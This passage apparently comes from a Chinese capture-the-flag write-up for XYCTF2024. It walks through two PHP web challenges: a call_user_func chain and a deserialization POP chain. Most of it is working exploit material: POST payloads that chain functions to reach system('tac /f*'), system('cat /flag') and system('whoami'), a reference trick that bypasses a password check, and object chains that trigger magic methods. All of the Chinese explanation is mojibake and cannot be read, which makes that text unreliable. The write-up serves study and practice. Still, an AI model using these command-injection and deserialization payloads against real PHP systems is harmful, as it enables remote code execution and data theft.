<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;you get 2 B &lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$a</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$b</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">;</span> <span class="c1">// 1. å°†æ•´ä¸ª $_POST æ•°ç»„å¤åˆ¶ç»™å˜é‡ $b
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$c</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">c</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$d</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">d</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$b</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]))</span> <span class="p">{</span> <span class="c1">// 2. æ£€æŸ¥ $b æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨é”® &#39;a&#39;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nx">unset</span><span class="p">(</span><span class="nv">$b</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]);</span> <span class="c1">// 3. å¦‚æœå­˜åœ¨ï¼Œå°±ä» $b æ•°ç»„ä¸­ç§»é™¤é”® &#39;a&#39; åŠå…¶å¯¹åº”çš„å€¼
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span><span class="nv">$b</span><span class="p">)(</span><span class="nv">$c</span><span class="p">)(</span><span class="nv">$d</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç»¼åˆä¸€ä¸‹æœ‰ä»¥ä¸‹å‡ ç§æ–¹æ¡ˆï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">c</span><span class="o">=</span><span class="s2">&#34;system&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">d</span><span class="o">=</span><span class="s2">&#34;tac /f*&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">a</span><span class="o">=</span><span class="nx">current</span><span class="o">&amp;</span><span class="nx">b</span><span class="o">=</span><span class="nx">sprintf</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">é¢˜ç›®é‡Œunsetäº†ä¸€ä¸‹$_POST[&#39;a&#39;]ï¼Œå…¶å®å°±æ˜¯æŠŠæ•°ç»„å…ƒç´ æ¸…äº†ä¸€ä¸ªï¼Œæœ‰å…³æ•°ç»„çš„æ“ä½œå¾ˆå®¹æ˜“å¯ä»¥æƒ³åˆ°currentï¼Œä¹Ÿå¯ä»¥ç”¨array_pop(array)è¿™ä¸ªæ˜¯åˆ é™¤æ•°ç»„å…ƒç´ å¹¶è¿”å›ï¼ŒåŸç†æ˜¯ä¸€æ ·çš„
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">call_user_func(&#39;current&#39;,&#39;$_POST&#39;)è¿”å›å€¼å®Œå…¨å¯æ§ï¼Œå¯ä»¥ä»¤å…¶ä¸ºsprintf
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">å…¶è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¿”å›å€¼å°±æ˜¯ä¼ å…¥çš„å‚æ•°
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">c</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">d</span><span class="o">=</span><span class="s2">&#34;tac /f*&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">a</span><span class="o">=</span><span class="nx">current</span><span class="o">&amp;</span><span class="nx">b</span><span class="o">=</span><span class="nx">current</span>
</span></span><span class="line"><span class="cl"><span class="k">or</span>
</span></span><span class="line"><span class="cl"><span class="nx">a</span><span class="o">=</span><span class="nx">array_pop</span><span class="o">&amp;</span><span class="nx">b</span><span class="o">=</span><span class="nx">array_pop</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">array_pop(array)æ˜¯åˆ é™¤æ•°ç»„å…ƒç´ å¹¶è¿”å›
</span></span></span><span class="line"><span class="cl"><span class="cm">array_pop(array(&#34;array_pop&#34;))(array(&#34;system&#34;))(&#34;cat /flag&#34;)
</span></span></span><span class="line"><span class="cl"><span class="cm">array_pop(array(&#34;system&#34;))(&#34;cat /flag&#34;)
</span></span></span><span class="line"><span class="cl"><span class="cm">system(&#34;cat /flag&#34;)
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸‹é¢æ˜¯å®˜æ–¹wp</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">call_user_func</span><span class="p">(</span><span class="nx">Closure</span><span class="o">::</span><span class="na">fromCallable</span><span class="p">[</span><span class="nx">Closure</span><span class="p">,</span><span class="nx">fromCallable</span><span class="p">])(</span><span class="s1">&#39;system&#39;</span><span class="p">)(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"> Closure::fromCallable  ä½¿ç”¨å½“å‰èŒƒå›´ä»ç»™å®šçš„  callback  åˆ›å»ºå¹¶è¿”å›ä¸€ä¸ªæ–°çš„åŒ¿åå‡½æ•°ã€‚æ­¤æ–¹æ³•æ£€æŸ¥  callback  å‡½æ•°åœ¨ä½œç”¨åŸŸæ˜¯å¦å¯è°ƒç”¨ï¼Œå¦‚æœä¸èƒ½ï¼Œå°±æŠ›å‡ºTypeErrorã€‚
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl"> 
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ezserialize">ezSerialize
</h2><h3 id="çŸ¥è¯†ç‚¹ååºåˆ—åŒ–çŸ¥è¯†ç‚¹æ‚ç³…">çŸ¥è¯†ç‚¹ï¼šååºåˆ—åŒ–çŸ¥è¯†ç‚¹æ‚ç³…
</h3><p><img src="/p/xyctf2024/image-20250830191416358.png"
	width="596"
	height="668"
	srcset="/p/xyctf2024/image-20250830191416358_hu17090091985203662864.png 480w, /p/xyctf2024/image-20250830191416358_hu15837842252412709741.png 1024w"
	loading="lazy"
	
		alt="image-20250830191416358"
	
	
		class="gallery-image" 
		data-flex-grow="89"
		data-flex-basis="214px"
	
></p>
<p>ç»•è¿‡<code>$this-&gt;token === $this-&gt;password</code>ï¼Œåˆ©ç”¨å¼•ç”¨ä¼ é€’è®©äºŒè€…ç›¸ç­‰</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$a-&gt;password = &amp;$a-&gt;token;
</span></span></code></pre></td></tr></table>
</div>
</div><p>åç»­è®©tokenç­‰äºmd5åŠ å¯†éšæœºæ•°ï¼Œpasswordä¹Ÿä¼šç›´æ¥ç­‰äºtoken</p>
<p><img src="/p/xyctf2024/image-20250830192824320.png"
	width="1107"
	height="547"
	srcset="/p/xyctf2024/image-20250830192824320_hu16716829314715622576.png 480w, /p/xyctf2024/image-20250830192824320_hu11396152849135783044.png 1024w"
	loading="lazy"
	
		alt="image-20250830192824320"
	
	
		class="gallery-image" 
		data-flex-grow="202"
		data-flex-basis="485px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">fpclosefpclosefpcloseffflllaaaggg</span><span class="o">.</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$mack</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mack</span><span class="o">-&gt;</span><span class="na">nonExistentMethod</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">B</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$luo</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$key</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;o.O&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$function</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">luo</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$function</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">C</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$wang1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$wang1</span><span class="p">,</span><span class="nv">$wang2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">include</span> <span class="s1">&#39;flag.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nv">$flag2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">D</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$lao</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$chen</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;O.o&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">is_null</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lao</span><span class="o">-&gt;</span><span class="na">chen</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&#34;&#34;</span> <span class="o">:</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lao</span><span class="o">-&gt;</span><span class="na">chen</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">E</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s2">&#34;xxxxx&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$num</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">__unserialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;å­¦åˆ°å°±æ˜¯èµšåˆ°!&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">!=</span><span class="s1">&#39;&#39;</span> <span class="o">||</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">num</span><span class="o">!=</span><span class="s1">&#39;&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;æ—…è¡Œè€…åˆ«å¿˜è®°æ—…è¡Œçš„æ„ä¹‰!&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pop&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pop&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> 
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¾ˆåŸºç¡€çš„é“¾å­ï¼Œå€¼å¾—ä¸€æçš„æ˜¯æœ‰wakeupçš„è¯ä¼šä¼˜å…ˆè°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œè€Œä¸æ˜¯unserialize</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">//è®°å¾—æŠŠnameçš„å€¼è°ƒä¸ºç©º
</span></span><span class="line"><span class="cl">$a = new E();
</span></span><span class="line"><span class="cl">$a -&gt; num = new D();
</span></span><span class="line"><span class="cl">$a -&gt; num -&gt; lao = new B();
</span></span><span class="line"><span class="cl">$a -&gt; num -&gt; lao -&gt; luo = new A();
</span></span><span class="line"><span class="cl">$a -&gt; num -&gt; lao -&gt; luo -&gt; mack = new C();
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xyctf2024/image-20250830194656372.png"
	width="1437"
	height="808"
	srcset="/p/xyctf2024/image-20250830194656372_hu511167534213423122.png 480w, /p/xyctf2024/image-20250830194656372_hu12198104437302250153.png 1024w"
	loading="lazy"
	
		alt="image-20250830194656372"
	
	
		class="gallery-image" 
		data-flex-grow="177"
		data-flex-basis="426px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// flag.php
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">class</span> <span class="nc">XYCTFNO1</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$Liu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$T1ng</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$upsw1ng</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$Liu</span><span class="p">,</span> <span class="nv">$T1ng</span><span class="p">,</span> <span class="nv">$upsw1ng</span> <span class="o">=</span> <span class="nx">Showmaker</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Liu</span> <span class="o">=</span> <span class="nv">$Liu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">T1ng</span> <span class="o">=</span> <span class="nv">$T1ng</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">upsw1ng</span> <span class="o">=</span> <span class="nv">$upsw1ng</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">XYCTFNO2</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$crypto0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$adwa</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$crypto0</span><span class="p">,</span> <span class="nv">$adwa</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">crypto0</span> <span class="o">=</span> <span class="nv">$crypto0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">XYCTF</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">adwa</span><span class="o">-&gt;</span><span class="na">crypto0</span> <span class="o">!=</span> <span class="s1">&#39;dev1l&#39;</span> <span class="k">or</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">adwa</span><span class="o">-&gt;</span><span class="na">T1ng</span> <span class="o">!=</span> <span class="s1">&#39;yuroandCMD258&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">False</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">True</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">XYCTFNO3</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$KickyMu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$fpclose</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$N1ght</span> <span class="o">=</span> <span class="s2">&#34;Crypto0&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$KickyMu</span><span class="p">,</span> <span class="nv">$fpclose</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">KickyMu</span> <span class="o">=</span> <span class="nv">$KickyMu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fpclose</span> <span class="o">=</span> <span class="nv">$fpclose</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">XY</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">N1ght</span> <span class="o">==</span> <span class="s1">&#39;oSthing&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;WOW, You web is really good!!!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="k">new</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;X&#39;</span><span class="p">](</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;Y&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">KickyMu</span><span class="o">-&gt;</span><span class="na">XYCTF</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">XY</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æœ€åä¸€å±‚ï¼Œ <code>echo new $_POST['X']($_POST['Y']);</code>æ˜æ˜¾æ˜¯åˆ©ç”¨åŸç”Ÿç±»çš„ï¼Œç„¶åæ˜¯é“¾å­çš„æ„é€ </p>
<p><code>if ($this-&gt;adwa-&gt;crypto0 != 'dev1l' or $this-&gt;adwa-&gt;T1ng != 'yuroandCMD258')</code>è¿™ä¸€å±‚æ¡ä»¶éœ€è¦è®©adwaåŒæ—¶æ‹¥æœ‰ä¸¤ä¸ªä¸åŒç±»çš„å±æ€§ï¼Œå…¶å®è‡ªå·±æ”¹ä¸€ä¸‹å°±è¡Œï¼Œéœ€è¦å¯¹åºåˆ—åŒ–ï¼Œååºåˆ—åŒ–æ›´äº†è§£ä¸€ç‚¹ã€‚</p>
